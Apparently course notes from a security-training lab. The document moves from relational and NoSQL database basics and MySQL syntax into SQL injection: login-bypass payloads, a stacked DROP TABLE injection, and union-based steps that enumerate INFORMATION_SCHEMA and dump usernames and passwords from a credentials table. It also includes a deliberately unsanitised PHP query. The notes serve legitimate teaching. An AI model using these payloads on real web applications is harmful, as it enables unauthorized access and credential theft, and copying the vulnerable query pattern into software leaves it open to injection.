
# Types of Databases

Databases are generally categorized into two main types: **Relational Databases** and **Non-Relational Databases**. 

## Relational Databases

A **relational database** is the most common type, using a **schema** to define the structure of the data. It stores data in tables that are linked using keys, allowing easy retrieval and management of related data.

### Key Concepts:
- **Schema**: A template that dictates the data structure.
- **Tables (Entities)**: Organized collections of data in rows and columns.
- **Keys**: Unique identifiers (Primary and Foreign keys) that link tables together.
- **RDBMS (Relational Database Management System)**: Manages relational databases, e.g., MySQL, SQL Server, PostgreSQL.

### Example:
- **Users Table**: Columns might include `id`, `username`, `first_name`, `last_name`.
- **Posts Table**: Columns might include `id`, `user_id`, `date`, `content`.
- **Linking Tables**: Using keys to link the `user_id` in the posts table to the `id` in the users table.

Relational databases are ideal for structured data with clear relationships and are easy to use and understand.

## Non-relational Databases (NoSQL)

A **non-relational database** (NoSQL) does not rely on tables, rows, columns, or keys. Instead, it stores data using various flexible storage models. These databases are scalable and better suited for unstructured data or data that changes frequently.

### Key Storage Models:
1. **Key-Value**: Stores data as key-value pairs (e.g., JSON or XML). Example: Redis.
2. **Document-Based**: Stores data in documents, often using JSON or BSON format. Example: MongoDB.
3. **Wide-Column**: Stores data in columns rather than rows, suited for large datasets. Example: Cassandra.
4. **Graph**: Stores data as nodes and edges, useful for representing relationships. Example: Neo4j.

### Example (Key-Value Model):
```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

### Use Case:
NoSQL is suitable for datasets that are not well-structured and can scale easily to handle large volumes of diverse data.

**Relational Databases** are best for structured data with clear relationships, while **Non-relational Databases (NoSQL)** offer more flexibility and scalability for unstructured or evolving data.

---

# Intro to MySQL

This section introduces MySQL and SQL basics, which are essential for understanding how SQL injections work and how to use them properly. We will explore MySQL/MariaDB syntax, commands, and concepts.

## Structured Query Language (SQL)

SQL is used to interact with relational databases. SQL syntax can vary across different RDBMS, but it follows the ISO standard for Structured Query Language. In this section, we will focus on MySQL/MariaDB syntax.

### SQL Operations:
SQL can be used for the following actions:
- **Retrieve data**
- **Update data**
- **Delete data**
- **Create new tables and databases**
- **Add/remove users**
- **Assign permissions to users**

## Command Line

The `mysql` utility is used to authenticate and interact with a MySQL/MariaDB database. Use the `-u` flag for the username and the `-p` flag for the password. Do not include the password directly in the command to avoid storing it in cleartext.

### Example:
```bash
$ mysql -u root -p
Enter password: <password>
mysql> 
```

To connect to a remote host, specify the host and port using the `-h` and `-P` flags:
```bash
$ mysql -u root -h docker.hackthebox.eu -P 3306 -p
Enter password: 
mysql> 
```
*Note: The default MySQL/MariaDB port is 3306.*

## Creating a Database

Once logged into MySQL, you can create a new database using the `CREATE DATABASE` statement.

### Example:
```sql
mysql> CREATE DATABASE users;
Query OK, 1 row affected (0.02 sec)
```

To view all databases, use the `SHOW DATABASES` command. To switch to a database, use the `USE` command:

```sql
mysql> SHOW DATABASES;
mysql> USE users;
```

**Note:** SQL statements are case-insensitive, but database names are case-sensitive.

## Tables in MySQL

Data in MySQL is stored in tables, which are organized into rows and columns. Each column has a specific data type, defining the kind of data it can hold.

### Creating a Table

To create a table, use the `CREATE TABLE` statement and define the columns and their data types.

### Example:
```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
);
```

### Checking Tables
To view the list of tables in the current database:
```sql
mysql> SHOW TABLES;
```

### Describing a Table
To view the structure of a table, use the `DESCRIBE` statement:
```sql
mysql> DESCRIBE logins;
```

## Table Properties

You can set various properties for tables and columns during creation.

### Common Properties:
- **AUTO_INCREMENT**: Automatically increments a column (often used for primary keys).
- **NOT NULL**: Ensures a column cannot have a null value.
- **UNIQUE**: Ensures the values in a column are unique.
- **DEFAULT**: Specifies a default value for a column.
- **PRIMARY KEY**: Uniquely identifies each record in the table.

### Example with Constraints:
```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
);
```

This example:
- Defines `id` as **AUTO_INCREMENT** and the **PRIMARY KEY**.
- Ensures that `username` is **UNIQUE** and **NOT NULL**.
- Sets `date_of_joining` to **DEFAULT NOW()**, which inserts the current date and time by default.

---

# SQL Statements

This section covers some essential SQL statements and their uses in MySQL.

## INSERT Statement

The `INSERT` statement is used to add new records to a table.

### Syntax:
```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```

- You must provide values for all columns in the table.
  
### Example:
```sql
mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
Query OK, 1 row affected (0.00 sec)
```

- You can insert data into specific columns by specifying column names:
```sql
mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
Query OK, 1 row affected (0.00 sec)
```

- You can insert multiple records at once:
```sql
mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
Query OK, 2 rows affected (0.00 sec)
```

**Note:** Inserting cleartext passwords is not recommended for production environments.

## SELECT Statement

The `SELECT` statement retrieves data from a table.

### Syntax:
- To select all columns:
```sql
SELECT * FROM table_name;
```

- To select specific columns:
```sql
SELECT column1, column2 FROM table_name;
```

## DROP Statement

The `DROP` statement removes a table or database.

### Example:
```sql
mysql> DROP TABLE logins;
Query OK, 0 rows affected (0.01 sec)

mysql> SHOW TABLES;
Empty set (0.00 sec)
```

- The `DROP` command permanently deletes a table with no confirmation, so use with caution.

## ALTER Statement

The `ALTER` statement is used to modify the structure of a table.

### Common Uses:
- **Add a new column**:
```sql
mysql> ALTER TABLE logins ADD newColumn INT;
Query OK, 0 rows affected (0.01 sec)
```

- **Rename a column**:
```sql
mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
Query OK, 0 rows affected (0.01 sec)
```

- **Modify a column's datatype**:
```sql
mysql> ALTER TABLE logins MODIFY newerColumn DATE;
Query OK, 0 rows affected (0.01 sec)
```

- **Drop a column**:
```sql
mysql> ALTER TABLE logins DROP newerColumn;
Query OK, 0 rows affected (0.01 sec)
```

## UPDATE Statement

The `UPDATE` statement is used to modify existing records in a table.

### Syntax:
```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```

### Example:
```sql
mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
Query OK, 3 rows affected (0.00 sec)

mysql> SELECT * FROM logins;
+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:47:16 |
+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```

- In the example above, all passwords for records where the `id` is greater than 1 are updated to `'change_password'`.

---


# Query Results

This section explains how to control and manipulate query results in MySQL.

## Sorting Results

You can sort the results of a query using the `ORDER BY` clause and specify the column to sort by.

### Syntax:
```sql
SELECT * FROM table_name ORDER BY column_name;
```

- By default, the sort order is **ascending (ASC)**. You can explicitly specify ascending or descending order.

- Sorting by multiple columns (secondary sort) is also possible.

## LIMIT Results

To control the number of records returned, use the `LIMIT` clause.

### Syntax:
```sql
SELECT * FROM table_name LIMIT number_of_records;
```

- You can specify an **offset** and limit the results starting from a certain record.

### Example:
```sql
SELECT * FROM table_name LIMIT offset, count;
```

## WHERE Clause

The `WHERE` clause is used to filter records based on a specified condition.

### Syntax:
```sql
SELECT * FROM table_name WHERE condition;
```

- Conditions can be used to filter records by values in a specific column.

## LIKE Clause

The `LIKE` clause allows pattern matching for string values.

- The `%` symbol matches any sequence of characters.
- The `_` symbol matches exactly one character.

### Syntax:
```sql
SELECT * FROM table_name WHERE column_name LIKE 'pattern';
```

- `LIKE` is useful when searching for records that match a certain pattern in string columns.

---

# SQL Operators

In SQL, operators allow us to manipulate and filter data based on multiple conditions. The most common logical operators include `AND`, `OR`, and `NOT`. These operators enable the combination of multiple conditions in a query.

## AND Operator

The `AND` operator combines two conditions and returns `true` only if both conditions are `true`. For example:

```sql
condition1 AND condition2
```

- The result is `true` if both conditions evaluate to `true`.
- The result is `false` if at least one condition evaluates to `false`.

### Example:

```sql
SELECT 1 = 1 AND 'test' = 'test';
-- Result: 1 (True)

SELECT 1 = 1 AND 'test' = 'abc';
-- Result: 0 (False)
```

- Any non-zero value is considered `true` (typically returns `1` for true).
- `0` is considered `false`.

## OR Operator

The `OR` operator also combines two conditions, but it returns `true` if **at least one condition** evaluates to `true`. If both conditions are `false`, it returns `false`.

```sql
condition1 OR condition2
```

### Example:

```sql
SELECT 1 = 1 OR 'test' = 'abc';
-- Result: 1 (True)

SELECT 1 = 2 OR 'test' = 'abc';
-- Result: 0 (False)
```

- In the first query, since `1 = 1` is `true`, the result is `true`.
- In the second query, both conditions are `false`, so the result is `false`.

## NOT Operator

The `NOT` operator inverts the boolean value of a condition. If the condition is `true`, it becomes `false`, and vice versa.

```sql
NOT condition
```

### Example:

```sql
SELECT NOT 1 = 1;
-- Result: 0 (False)

SELECT NOT 1 = 2;
-- Result: 1 (True)
```

## Symbol Operators

Logical operators can also be represented by symbols:

- `AND` can be written as `&&`
- `OR` can be written as `||`
- `NOT` can be written as `!`

### Example:

```sql
SELECT 1 = 1 && 'test' = 'abc';
-- Result: 0 (False)

SELECT 1 = 1 || 'test' = 'abc';
-- Result: 1 (True)

SELECT 1 != 1;
-- Result: 0 (False)
```

## Using Operators in Queries

### `NOT` Operator Example:

To select all records where the username is **not** "john":

```sql
SELECT * FROM logins WHERE username != 'john';
```

### `AND` Operator Example:

To select users who have their `id` greater than 1 **and** the username is **not** "john":

```sql
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```

## Operator Precedence

When combining multiple operations in a query, SQL follows operator precedence to determine the order of evaluation. Here is a list of common operations in order of precedence (highest to lowest):

1. Division (`/`), Multiplication (`*`), Modulus (`%`)
2. Addition (`+`) and Subtraction (`-`)
3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
4. `NOT` (`!`)
5. `AND` (`&&`)
6. `OR` (`||`)

### Example:

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

- `3 - 2` is evaluated first, resulting in `1`.
- Then, the query checks for `username != 'tom'` and `id > 1`.
- It will return records where the username is not "tom" **and** the `id` is greater than 1.

### Example Output:

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;

-- Result:
| id  | username      | password   | date_of_joining     |
|-----|---------------|------------|---------------------|
| 2   | administrator | adm1n_p@ss | 2020-07-03 12:03:53 |
| 3   | john          | john123!   | 2020-07-03 12:03:57 |
```


---

# Introduction to SQL Injections

## Use of SQL in Web Applications
Web applications interact with MySQL to store and retrieve data. Here's an example in PHP:

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

User input is often passed into SQL queries. For example:

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

## What is SQL Injection?
SQL injection occurs when user input is directly passed into SQL queries without sanitization, allowing attackers to manipulate the query.

### Example:
If input is not sanitized, an attacker can input something like:
```sql
1'; DROP TABLE users;
```
This could delete the `users` table by modifying the query:
```sql
select * from logins where username like '%1'; DROP TABLE users;';
```

## Types of SQL Injections

### 1. **In-band SQL Injection**  
The output is printed directly on the web page. It has two types:
- **Union-Based**: Combines results from multiple queries and directs them to the page.
- **Error-Based**: Relies on errors that reveal database structure.

### 2. **Blind SQL Injection**  
No direct output. The attacker infers data using:
- **Boolean-Based**: Uses true/false conditions to determine data.
- **Time-Based**: Delays the page response to infer data.

### 3. **Out-of-Band SQL Injection**  
The attacker sends data to a remote location (like a DNS server) and retrieves it from there.


---

# Using Comments in SQL
- **Purpose**: Document queries or ignore parts of the query.
- **Line Comments**:
  - `-- ` (requires a space at the end)
  - `# `

### Examples
```sql
SELECT username FROM logins; -- Selects usernames from the logins table
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

### Tips
- In URLs, spaces are encoded as `+` or `%20`.
- Use `%23` to represent `#` in URLs.

### Auth Bypass with Comments
- **Injection Example**: `admin'--`
- **Final Query**:
  ```sql
  SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
  ```
- **Outcome**: Logs in as `admin` by bypassing additional conditions.

### Using Parentheses in SQL
- Ensures certain conditions are checked first.
- **Example**: 
  ```sql
  SELECT * FROM logins WHERE (username='admin')-- )
  ```

### Steps to Bypass Login
1. **Original Query**: 
   ```sql
   SELECT * FROM logins where (username='admin') AND password='hashed_value'
   ```
2. **Modified Query**: 
   ```sql
   SELECT * FROM logins where (username='admin')-- )
   ```

---

# Union Clause 

#### Union Clause
- **Purpose**: Combine results from multiple `SELECT` statements.
- **Usage**: 
  ```sql
  SELECT column1, column2 FROM table1
  UNION
  SELECT column1, column2 FROM table2;
  ```
- **Example**:
  ```sql
  SELECT * FROM ports 
  UNION 
  SELECT * FROM ships;
  ```

#### Even Columns
- **Requirement**: All `SELECT` statements must return the same number of columns.
- **Example**:
  ```sql
  -- This will cause an error:
  SELECT city FROM ports 
  UNION 
  SELECT * FROM ships;
  ```

#### Union Injection
- **Purpose**: Injecting entire SQL queries executed with the original query.
- **Example**:
  ```sql
  SELECT * FROM products WHERE product_id = 'user_input'
  UNION 
  SELECT username, password FROM passwords-- ';
  ```

#### Uneven Columns
- **Solution**: Use "junk" data to balance the number of columns.
- **Example with Junk Data**:
  ```sql
  SELECT * FROM products WHERE product_id = '1' 
  UNION 
  SELECT username, 2 FROM passwords;
  ```
- **Handling More Columns**:
  ```sql
  UNION SELECT username, 2, 3, 4 FROM passwords-- ';
  ```

#### Full Example
- **Original Query**:
  ```sql
  SELECT * FROM products WHERE product_id = '1';
  ```
- **Union Injection**:
  ```sql
  UNION SELECT username, 2, 3, 4 FROM passwords-- ';
  ```

- **Result**:
  ```sql
  +-----------+-----------+-----------+-----------+
  | product_1 | product_2 | product_3 | product_4 |
  +-----------+-----------+-----------+-----------+
  |   admin   |    2      |    3      |    4      |
  +-----------+-----------+-----------+-----------+
  ```

#### Tips
- **Data Type Matching**: Ensure junk data matches the column's data type to avoid errors.
- **Using `NULL`**: For advanced injections, `NULL` can be used as it fits all data types.
  ```sql
  UNION SELECT username, NULL, NULL, NULL FROM passwords-- ';
  ```

---



# Union Injection in SQL

#### Detecting Vulnerability
- **Initial Test**: Inject a single quote (`'`) to see if it causes an error.
  ```sql
  http://SERVER_IP:PORT/search.php?port_code=cn'
  ```
- **Error Response**: Indicates potential SQL injection vulnerability.

#### Detecting Number of Columns
- **Method 1: Using ORDER BY**
  - Incrementally add `ORDER BY` clauses until an error occurs.
  ```sql
  ' order by 1-- -
  ' order by 2-- -
  ' order by 3-- -
  ' order by 4-- -  -- Error occurs here, meaning there are 3 columns.
  ```

- **Method 2: Using UNION**
  - Attempt UNION injection with increasing columns until successful.
  ```sql
  cn' UNION select 1,2,3-- -  -- Error
  cn' UNION select 1,2,3,4-- -  -- Success, meaning there are 4 columns.
  ```

#### Location of Injection
- **Identify Displayed Columns**: Use numbers as junk data to see which columns are printed.
  ```sql
  cn' UNION select 1,2,3,4-- -
  ```
  - Only columns `2`, `3`, and `4` are displayed.

- **Replace with Real Data**: Test with actual data to confirm display.
  ```sql
  cn' UNION select 1,@@version,3,4-- -
  ```
  - `@@version` will display the database version.

### Steps to Union Injection
1. **Initial Test for Vulnerability**:
   - Inject single quote (`'`).
2. **Detect Number of Columns**:
   - Use `ORDER BY` or `UNION` to find the number of columns.
3. **Identify Displayed Columns**:
   - Inject numbers (`1, 2, 3...`) to see which columns are displayed.
4. **Replace with Real Data**:
   - Use SQL queries in identified columns to get desired data.

### Example
- **Original Query**:
  ```sql
  SELECT * FROM ports WHERE port_code = 'cn';
  ```
- **Union Injection**:
  ```sql
  cn' UNION select 1,@@version,3,4-- -
  ```
  - Displays the database version.

---

# Database Enumeration 

## MySQL Fingerprinting

- **Identify DBMS Type**: Helps determine the right queries to use.

- **Fingerprint MySQL**:
  - `SELECT @@version`:
    - **Purpose**: Identifies the version of the MySQL database.
    - **Expected Output**: MySQL version, e.g., `10.3.22-MariaDB-1ubuntu1`.
    - **Wrong Output**: Returns MSSQL version if it's MSSQL, or an error if it's another DBMS.
  
  - `SELECT POW(1,1)`:
    - **Purpose**: Simple mathematical operation to confirm MySQL.
    - **Expected Output**: `1`.
    - **Wrong Output**: Returns an error with other DBMS.
  
  - `SELECT SLEEP(5)`:
    - **Purpose**: Delays the response to confirm a blind SQL injection.
    - **Expected Output**: Delays response for 5 seconds and returns `0`.
    - **Wrong Output**: Will not delay response with other DBMS.

### INFORMATION_SCHEMA Database

- **Purpose**: Contains metadata about all databases and tables.
- **Reference Tables**: Use the dot `.` operator to reference tables in other databases.
  ```sql
  SELECT * FROM my_database.users;
  ```

#### SCHEMATA Table

- **Purpose**: Lists all databases on the server.
  ```sql
  SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
  ```
- **Union Injection Example**:
  ```sql
  cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
  ```
  - **Explanation**: This will list all database names. The columns `1`, `3`, and `4` are placeholders to match the number of columns in the original query.

#### Current Database

- **Find Current Database**:
  ```sql
  SELECT database();
  ```
- **Union Injection Example**:
  ```sql
  cn' UNION select 1,database(),2,3-- -
  ```
  - **Explanation**: This retrieves the name of the current database the application is using. Here `1`, `2`, and `3` are placeholders.

#### TABLES Table

- **Purpose**: Lists all tables within a specific database.
  ```sql
  SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev';
  ```
- **Union Injection Example**:
  ```sql
  cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
  ```
  - **Explanation**: This query retrieves the names of all tables within the `dev` database. The columns `1` and `4` are placeholders.

#### COLUMNS Table

- **Purpose**: Lists all columns within a specific table.
  ```sql
  SELECT COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials';
  ```
- **Union Injection Example**:
  ```sql
  cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
  ```
  - **Explanation**: This query retrieves the column names from the `credentials` table. The columns `1` and `TABLE_NAME` are placeholders.

### Extracting Data

- **Union Injection to Dump Data**:
  ```sql
  cn' UNION select 1, username, password, 4 from dev.credentials-- -
  ```
  - **Explanation**: This query dumps the `username` and `password` data from the `dev.credentials` table. The columns `1` and `4` are placeholders to balance the number of columns.

---

